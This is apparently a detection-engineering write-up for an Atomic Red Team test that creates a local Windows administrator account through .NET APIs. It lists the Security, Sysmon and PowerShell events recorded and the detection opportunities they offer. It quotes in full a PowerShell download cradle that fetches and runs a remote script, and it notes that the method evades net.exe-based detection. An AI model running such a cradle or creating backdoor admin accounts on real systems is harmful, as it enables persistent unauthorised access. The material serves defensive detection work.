# T1136.001-9: Local Account — Create a new Windows admin user via .NET

## Technique Context

Creating local accounts (T1136.001) is a persistence technique where attackers establish backdoor credentials on a compromised system. The traditional approach uses `net user /add` from the command line, which is broadly detected. This test uses a more evasive approach: it downloads and executes a PowerShell script that leverages the .NET `System.DirectoryServices.AccountManagement` namespace directly — specifically `PrincipalContext`, `UserPrincipal`, and `GroupPrincipal` objects — to create a local administrator account without invoking the `net` command. This .NET API approach can bypass simple command-line detections focused on `net.exe`. The test downloads the script at runtime from GitHub (`https://raw.githubusercontent.com/0xv1n/dotnetfun/...Persistence/CreateNewLocalAdmin_ART.ps1`), creates a user named `NewLocalUser` with password `P@ssw0rd123456789!`, adds it to the Administrators group, validates with `net user NewLocalUser`, and then performs cleanup by deleting the account.

## What This Dataset Contains

With Windows Defender disabled, this dataset captures the complete account creation lifecycle on ACME-WS06.acme.local, including account creation, group membership changes, validation, and deletion.

**Full account lifecycle in Security events:** The Security channel provides exceptionally rich telemetry across 12 distinct event IDs spanning the entire operation:

- **EID 4688:** PowerShell spawns child PowerShell with command `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}` — the download cradle is fully visible
- **EID 4720:** "A user account was created" for `NewLocalUser` on `ACME-WS06`, with SID `S-1-5-21-1024873681-3998968759-1653567624-1002` — the account creation itself
- **EID 4722:** "A user account was enabled" — the initial account state transitions from disabled to enabled
- **EID 4724:** "An attempt was made to reset an account's password" — the script explicitly sets the password
- **EID 4738 (x2):** Account modification events showing the UAC value changing from `0x15` (disabled, no-password) to `0x10` (enabled, password required) and then to `0x210` (enabled, password never expires)
- **EID 4728:** Member added to a security-enabled global group (Domain Users — SID `S-1-5-21-1024873681-3998968759-1653567624-513`)
- **EID 4799:** Administrators local group membership enumerated by PowerShell (PID 0x4680)
- **EID 4798 (x4):** `NewLocalUser`'s local group membership enumerated by both PowerShell and net1.exe
- **EID 4732:** Member added to the Administrators local group (SID `S-1-5-32-544`)
- **EID 4688:** `net.exe` with command `"C:\Windows\system32\net.exe" user NewLocalUser` — the validation step
- **EID 4688:** `net1.exe` with `C:\Windows\system32\net1 user NewLocalUser` — net.exe's internal implementation
- **EID 4733:** Member removed from Administrators (cleanup)
- **EID 4729:** Member removed from Domain Users (cleanup)
- **EID 4726:** "A user account was deleted" — `NewLocalUser` account removed

**Sysmon process telemetry:** Sysmon EID 1 captures the child PowerShell (PID 18048) with the full download cradle command line, and a second child PowerShell (PID 17664) for the cleanup phase. `whoami.exe` executions are present for identity checks.

**PowerShell EID 4104:** The script block logging captures `Invoke-AtomicTest T1136.001 -TestNumbers 9 -Cleanup -Confirm:$false` for the cleanup phase, confirming the complete test-then-cleanup cycle.

**Sysmon EID 3 and EID 22:** The dataset includes Sysmon EID 3 and EID 22 events reflecting network connections and DNS queries, consistent with the PowerShell script download from GitHub.

Compared to the defended dataset (62 Sysmon, 16 Security, 48 PowerShell), this undefended run has fewer Sysmon events (43) but far richer Security channel content (21 events vs. 16). The defended dataset lacked the EID 4720 account creation events — the defended run's Security channel was dominated by 4688 process creation events without account lifecycle events, suggesting Defender blocked the script before account creation occurred. Here, the full account lifecycle is present.

## What This Dataset Does Not Contain

**Script block content of CreateNewLocalAdmin_ART.ps1:** The script itself — including the .NET API calls `Add-Type -AssemblyName System.DirectoryServices.AccountManagement`, `New-Object System.DirectoryServices.AccountManagement.PrincipalContext`, and `$User.Save()` — is present in the full 109 EID 4104 events but not in the 20 samples surfaced here. The full dataset's PowerShell channel contains this content.

**Network connection to GitHub:** The download from `raw.githubusercontent.com` would generate Sysmon EID 3 and EID 22 events. These are noted as present in the full dataset (EID 3: 4 events, EID 22: 4 events) but not surfaced in the samples.

**Domain controller corroboration:** The account was created as a local account on ACME-WS06, not a domain account. No domain controller events are involved or expected. The SID `S-1-5-21-1024873681-3998968759-1653567624-1002` is the workstation's local SID space.

## Assessment

This is one of the richest datasets in the batch. The Security channel captures the complete account lifecycle — from creation through group membership changes, attribute modifications, validation, and deletion — across 12 distinct event IDs. This is exactly the telemetry that Security Operations Centers rely on for detecting persistence via local account creation.

The contrast with the defended variant is stark: the defended run did not produce EID 4720, 4722, 4728, or 4732 events because Defender blocked the script before the account was created. Here, the technique executes fully and generates the canonical account management events that form the basis of most account creation detections. This dataset is well-suited for testing detection rules that correlate Security account lifecycle events with the originating PowerShell process.

The download cradle visibility in Security EID 4688 (`iex(new-object net.webclient).downloadstring(...)`) is particularly notable: this specific pattern — `iex` with a `.downloadstring` call to a GitHub raw URL — is a high-fidelity detection that would catch this technique regardless of the script's content.

## Detection Opportunities Present in This Data

- **Security EID 4720 → EID 4732:** Account created and immediately added to Administrators in rapid succession from the same SYSTEM logon context — a reliable high-fidelity pattern for backdoor account creation
- **Security EID 4688:** PowerShell spawning child PowerShell with `iex(new-object net.webclient).downloadstring(...)` — the download cradle pattern is clearly visible in the process command line
- **Security EID 4688 chain:** `net.exe` then `net1.exe` both executing `user NewLocalUser` for account validation, spawned from PowerShell running as SYSTEM
- **Security EID 4799:** PowerShell enumerating Administrators group membership is unusual for non-administrative workstation PowerShell
- **Security EID 4798:** Local group membership enumerated by PowerShell for a newly created account is a strong behavioral indicator in combination with EID 4720
- **Security EID 4726:** Account creation immediately followed by deletion within the same session is a distinct ART test artifact but also mirrors some attacker cleanup behaviors
- **PowerShell EID 4104:** The .NET API pattern `System.DirectoryServices.AccountManagement.UserPrincipal` in script block logs is unusual in normal workstation PowerShell
